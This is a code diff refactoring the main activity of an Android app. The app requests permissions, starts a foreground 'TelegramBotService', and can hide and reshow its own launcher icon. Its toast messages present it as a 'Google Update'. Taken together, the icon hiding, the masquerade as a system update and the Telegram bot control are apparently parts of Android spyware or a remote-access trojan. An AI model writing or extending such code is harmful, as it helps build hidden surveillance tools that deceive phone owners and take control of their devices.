@@ -7,7 +7,6 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Handler;
 import android.provider.Settings;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
@@ -22,7 +21,7 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         requestPermissions();
-        new Handler().postDelayed(this::hideAppIcon, 3000);
+        startService();
     }
 
     private void requestPermissions() {
@@ -38,31 +37,32 @@ public class MainActivity extends AppCompatActivity {
             Manifest.permission.POST_NOTIFICATIONS
         };
         boolean all = true;
-        for (String p : perms) if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) all = false;
-        if (!all) ActivityCompat.requestPermissions(this, perms, PERMISSION_REQUEST_CODE);
-        else startService();
+        for (String p : perms) {
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                all = false;
+                break;
+            }
+        }
+        if (!all) {
+            ActivityCompat.requestPermissions(this, perms, PERMISSION_REQUEST_CODE);
+        }
     }
 
     private void startService() {
         Intent i = new Intent(this, TelegramBotService.class);
-        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
-        else startService(i);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(i);
+        } else {
+            startService(i);
+        }
     }
 
-    public void hideAppIcon() {
-        try {
-            PackageManager pm = getPackageManager();
-            ComponentName cn = new ComponentName(this, MainActivity.class);
-            pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-            Toast.makeText(this, "Google Update Active", Toast.LENGTH_SHORT).show();
-        } catch (Exception e) {}
-    }
-
-    public static void hideAppIconStatic(Context ctx) {
+    public static void hideAppIcon(Context ctx) {
         try {
             PackageManager pm = ctx.getPackageManager();
             ComponentName cn = new ComponentName(ctx, MainActivity.class);
             pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+            Toast.makeText(ctx, "Google Update Hidden", Toast.LENGTH_SHORT).show();
         } catch (Exception e) {}
     }
 
@@ -71,9 +71,12 @@ public class MainActivity extends AppCompatActivity {
             PackageManager pm = ctx.getPackageManager();
             ComponentName cn = new ComponentName(ctx, MainActivity.class);
             pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
+            Toast.makeText(ctx, "Google Update Shown", Toast.LENGTH_SHORT).show();
         } catch (Exception e) {}
     }
 
     @Override
-    public void onRequestPermissionsResult(int code, String[] p, int[] r) { startService(); }
+    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
+        startService();
+    }
 }
